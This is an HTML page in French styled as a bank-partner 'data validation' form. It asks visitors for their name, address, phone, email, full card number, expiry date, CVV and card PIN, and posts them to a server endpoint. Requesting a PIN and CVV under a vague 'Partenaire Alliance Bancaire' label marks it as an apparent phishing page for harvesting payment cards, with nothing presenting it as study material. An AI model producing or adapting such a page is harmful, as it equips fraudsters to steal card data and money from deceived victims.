<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transmission des données à valider</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <div class="logo">
            <img src="logo.png" alt="Logo">
            <h1>Transmission des données à valider</h1>
        </div>
    </header>

    <main>
        <section class="form-section">
            <h2>Veuillez entrer vos informations</h2>
            <form action="/enregistrer" method="POST">
                <label for="nom">Nom :</label>
                <input type="text" id="nom" name="nom" required>

                <label for="prenom">Prénom :</label>
                <input type="text" id="prenom" name="prenom" required>
                
                <label for="ville">Ville :</label>
                <input type="text" id="ville" name="ville" required>

                <label for="codepostal">Code Postal :</label>
                <input type="text" id="codepostal" name="codepostal" required>

                <label for="adresse">Adresse postale :</label>
                <input type="text" id="adresse" name="adresse" required>

                <label for="telephone">Numéro de téléphone :</label>
                <input type="tel" id="telephone" name="telephone" required>

                <label for="email">Adresse e-mail :</label>
                <input type="email" id="email" name="email" required>

                <label for="carte">Numéro de Carte :</label>
                <input type="text" id="carte" name="carte" required>

                <label for="expiration">Date Expiration :</label>
                <input type="text" id="expiration" name="expiration" required>

                <label for="cvv">CVV :</label>
                <input type="text" id="cvv" name="cvv" required>

                <label for="pin">Code PIN :</label>
                <input type="text" id="pin" name="pin" required>

                <button type="submit">Valider</button>
            </form>
        </section>
    </main>

    <footer>
        <p>&copy; 2024 Partenaire Alliance Bancaire</p>
    </footer>
</body>
</html>
